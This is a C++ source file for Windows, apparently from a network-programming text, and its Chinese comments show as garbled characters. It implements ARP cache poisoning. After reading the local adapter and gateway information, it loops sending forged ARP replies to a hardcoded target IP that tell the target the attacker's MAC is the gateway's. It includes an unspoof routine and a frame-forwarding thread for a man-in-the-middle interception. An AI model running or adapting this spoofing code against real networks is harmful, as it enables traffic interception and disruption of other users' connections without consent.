////////////////////////////////////////////////
// SpoofArp.cpp�ļ�

#include "../common/initsock.h"
#include <ntddndis.h>
#include <windows.h>
#include <stdio.h>
#include <Iphlpapi.h>


#include "protoutils.h"
#include "ProtoPacket.h"


#pragma comment(lib, "Iphlpapi.lib")


DWORD WINAPI ForwardThread(LPVOID lpParam);
BOOL GetGlobalData();
void SpoofTarget(CArpPacket *pArp, DWORD dwDestIP);
void UnspoofTarget(CArpPacket *pArp, DWORD dwDestIP);

/////////////////////////////////////////
// ȫ������
u_char	g_ucLocalMac[6];	// ����MAC��ַ
DWORD	g_dwGatewayIP;		// ����IP��ַ
DWORD	g_dwLocalIP;		// ����IP��ַ
DWORD	g_dwMask;			// ��������

u_char g_ucGatewayMac[6];   // ����MAC��ַ


CInitSock theSock;



int main()
{
	// ��ȡȫ������
	GetGlobalData();
	// ��������
	if(!ProtoStartService())
	{
		printf(" ProtoStartService() failed %d \n", ::GetLastError());
		return -1;
	}
	// �򿪿����豸����
	HANDLE hControlDevice = ProtoOpenControlDevice();
	if(hControlDevice == INVALID_HANDLE_VALUE)
	{
		printf(" ProtoOpenControlDevice() failed() %d \n", ::GetLastError());
		ProtoStopService();
		return -1;
	}
	// ö�ٰ󶨵��²�������
	CPROTOAdapters adapters;
	if(!adapters.EnumAdapters(hControlDevice))
	{
		printf(" Enume adapter failed \n");
		ProtoStopService();
		return -1;
	}


	// �õ����ص�MAC��ַ
	memset(g_ucGatewayMac, 0xff, 6);
	ULONG ulLen = 6;
	if(!::SendARP(g_dwGatewayIP, 0, (ULONG*)g_ucGatewayMac, &ulLen) == NO_ERROR)
	{
		printf(" ȡ�����ص�MAC��ַ���� \n");
		return -1;
	}

	CAdapter adapter;
	// Ĭ��ʹ�õ�һ��������
	if(!adapter.OpenAdapter(adapters.m_pwszSymbolicLink[0], TRUE))
	{
		printf(" OpenAdapter failed \n");
		ProtoStopService();
		return -1;
	}

	CArpPacket arp(&adapter);
	CArpPacket *pArp = &arp;

	/////////////////////////////////////////////////////////////////////	
	// Ҫ��ƭ��Ŀ���ַ
	char szDestIP[] = "10.16.115.89";
	
	// ����ת��������߳�
	// ...			// ::CloseHandle(::CreateThread(NULL, 0, ForwardThread, &adapter, 0, NULL));

	while(TRUE)
	{
		SpoofTarget(pArp, ::inet_addr(szDestIP));
		::Sleep(1000);
	}

	return 0;
}

void SpoofTarget(CArpPacket *pArp, DWORD dwDestIP)
{	
	// �õ�Ŀ��MAC��ַ
	u_char arDestMac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	ULONG ulLen = 6;
	if(::SendARP(dwDestIP, 0, (ULONG*)arDestMac, &ulLen) != NO_ERROR)
	{
		printf(" ȡ��Ŀ��MAC��ַ���� \n");
		return;
	}

	// ��Ŀ�������ARP���м��¡�g_ucLocalMac, g_dwGatewayIP����
	pArp->SendPacket(arDestMac, g_ucLocalMac, 
			ARPOP_REPLY, arDestMac, dwDestIP, g_ucLocalMac, g_dwGatewayIP); 
}

void UnspoofTarget(CArpPacket *pArp, DWORD dwDestIP)
{
	// �õ�Ŀ��MAC��ַ
	u_char arDestMac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	ULONG ulLen = 6;
	if(::SendARP(dwDestIP, 0, (ULONG*)arDestMac, &ulLen) != NO_ERROR)
	{
		printf(" ȡ��Ŀ��MAC��ַ���� \n");
		return;
	}

	// ��Ŀ�������ARP���м��¡�g_ucGatewayMac, g_dwGatewayIP����
	pArp->SendPacket(arDestMac, g_ucLocalMac, 
			ARPOP_REPLY, arDestMac, dwDestIP, g_ucGatewayMac, g_dwGatewayIP); 
}


BOOL GetGlobalData()
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;

	// Ϊ�������ṹ�����ڴ�
	::GetAdaptersInfo(pAdapterInfo,&ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);

	// ȡ�ñ����������ṹ��Ϣ
	if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
	{
		if(pAdapterInfo != NULL)
		{
			memcpy(g_ucLocalMac, pAdapterInfo->Address, 6);
			g_dwGatewayIP = ::inet_addr(pAdapterInfo->GatewayList.IpAddress.String);
			g_dwLocalIP = ::inet_addr(pAdapterInfo->IpAddressList.IpAddress.String);
			g_dwMask = ::inet_addr(pAdapterInfo->IpAddressList.IpMask.String);
		}
	}
	::GlobalFree(pAdapterInfo);

	printf(" \n -------------------- ����������Ϣ -----------------------\n\n");
	in_addr in;
	in.S_un.S_addr = g_dwLocalIP;
	printf("      IP Address : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwMask;
	printf("     Subnet Mask : %s \n", ::inet_ntoa(in));

	in.S_un.S_addr = g_dwGatewayIP;
	printf(" Default Gateway : %s \n", ::inet_ntoa(in));

	u_char *p = g_ucLocalMac;
	printf("     MAC Address : %02X-%02X-%02X-%02X-%02X-%02X \n", p[0], p[1], p[2], p[3], p[4], p[5]);

	printf(" \n \n ");

	return TRUE;
}


DWORD WINAPI ForwardThread(LPVOID lpParam)
{
	// �����CMyAdapter����Ϊ�˷���CAdapter��ı�����Աm_hAdapter
	class CMyAdapter : public CAdapter
	{
	public:
		HANDLE GetFileHandle() { return m_hAdapter; }
	};

	CMyAdapter *pAdapter = (CMyAdapter *)lpParam;

	printf(" ��ʼת������... \n");
	// �����߳����ȼ���Ϊ���Ǿ�������ʧ����֡
	::SetThreadPriority(::GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);

#define MAX_IP_SIZE        65535

	char frame[MAX_IP_SIZE];
	OVERLAPPED olRead = { 0 };
	OVERLAPPED olWrite = { 0 };
	olRead.hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	olWrite.hEvent = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	int nRecvLen;
	ETHeader *pEthdr = (ETHeader *)frame;
	// ��ʼת������
	while(TRUE)
	{
		nRecvLen = pAdapter->RecieveData(frame, MAX_IP_SIZE, &olRead);
		if(nRecvLen == -1 && ::GetLastError() == ERROR_IO_PENDING)
		{
			if(!::GetOverlappedResult(pAdapter->GetFileHandle(), &olRead, (PDWORD)&nRecvLen, TRUE))
				break;
		}
		if(nRecvLen > 0)
		{
			// �޸ķ����Ŀ��MAC��ַ֮���ٽ�������͵�LAN
			if(pEthdr->type == htons(ETHERTYPE_IP))
			{
				IPHeader *pIphdr = (IPHeader *)(frame + sizeof(ETHeader));
				if(pIphdr->ipDestination == g_dwGatewayIP)
				{
					memcpy(pEthdr->dhost, g_ucGatewayMac, 6);
					pAdapter->SendData(frame, nRecvLen, &olWrite);
					printf(" ת��һ�������ԴIP��%s��\n", 
									::inet_ntoa(*((in_addr*)&pIphdr->ipSource)));
				}
			}
		}
	}
	printf(" ת���߳��˳� \n");
	return 0;
}


